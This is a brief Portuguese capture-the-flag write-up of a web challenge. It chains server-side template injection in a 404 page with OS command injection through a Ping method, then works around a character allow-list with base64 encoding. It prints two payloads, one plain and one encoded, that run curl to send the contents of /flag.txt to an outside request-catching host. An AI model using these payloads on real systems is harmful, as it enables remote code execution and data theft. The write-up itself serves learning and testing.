
# Análise inicial

  

Na página principal da aplicação, há a funcionalidade de se pingar o host https://hackersdobem.org.br/

  

Quando se tenta acessar um recurso que não existe, a página de resposta reflete o recurso que tentou ser acessado e diz que ele não existe.

  

Analisando o código fonte da aplicação, nota-se a presença de uma allow-list de caracteres, listando os caracteres que podem ser utilizados e que serão refletidos na página de Erro 404.

  

# Vulnerabilidade

  

Explorar **Server-Side Template Injection** na reflexão de um recurso inexistente, utilizando o método da classe Ping.php e realizar um **OS Command Injection** na passagem de parâmetro para o método.

  

A execução do command injection não trará a saída do comando executado para a página (**blind RCE**), sendo necessário utilizar uma ferramenta como o curl para extrair informações da máquina alvo.

  

Além disso, deve-se respeitar os caracteres definidos na **allow-list** para a construção do payload.

  

Isso é possível utilizando o encoding base64 para montar o payload final.

  

#### Payload RCE:

    {Ping::ping(';curl https://xyz.requestcatcher.com/`cat /flag.txt`')}


#### Payload Final:

    {include file="eval:base64:e1Bpbmc6OnBpbmcoJztjdXJsIGh0dHBzOi8vY2hhcmxpZXRvYnMucmVxdWVzdGNhdGNoZXIuY29tL2BjYXQgL2ZsYWcudHh0YCcpfQ=="}